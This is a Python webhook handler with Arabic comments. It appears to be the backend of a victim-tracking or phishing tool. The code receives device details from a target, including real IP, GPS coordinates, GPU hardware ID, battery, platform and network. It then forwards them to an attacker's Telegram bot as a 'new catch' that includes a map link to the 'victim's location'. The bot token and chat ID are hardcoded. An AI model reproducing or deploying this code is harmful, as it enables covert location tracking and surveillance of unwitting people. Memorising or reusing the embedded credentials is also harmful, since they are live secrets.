from http.server import BaseHTTPRequestHandler
import json
import requests

# بياناتك الصحيحة
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            device = data.get('device', {})
            action_type = data.get('action', 'نشاط غير محدد')
            gps = device.get('gps')

            # تحويل الإحداثيات لرابط قوقل ماب إذا كانت متوفرة
            maps_link = "غير متوفر (لم يوافق)"
            if isinstance(gps, dict):
                lat = gps.get('lat')
                lon = gps.get('lon')
                maps_link = f"https://www.google.com/maps?q={lat},{lon}"

            # تجهيز رسالة الصيدة مع رابط الخريطة
            message = (
                "⚠️ ** صيدة جديدة ** ⚠️\n"
                "━━━━━━━━━━━━━━━\n"
                f"📝 **العملية:** {action_type}\n"
                f"🌐 **الـ IP الحقيقي:** `{device.get('ip', 'مخفي')}`\n"
                f"🔋 **البطارية:** {device.get('battery', 'N/A')}\n"
                f"🆔 **HW-ID (GPU):** `{device.get('gpu_hwid', 'N/A')}`\n"
                f"📱 **نوع الجهاز:** {device.get('platform', 'N/A')}\n"
                f"🖥 **دقة الشاشة:** {device.get('screen', 'N/A')}\n"
                f"📶 **نوع الشبكة:** {device.get('network', 'N/A')}\n\n"
                f"📍 **موقع الضحية على الخريطة:**\n{maps_link}\n"
                "━━━━━━━━━━━━━━━"
            )

            # الإرسال لبوت التليجرام
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
            )

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())

        except Exception as e:
            print(f"Server Error: {e}")
            self.send_response(500)
            self.end_headers()
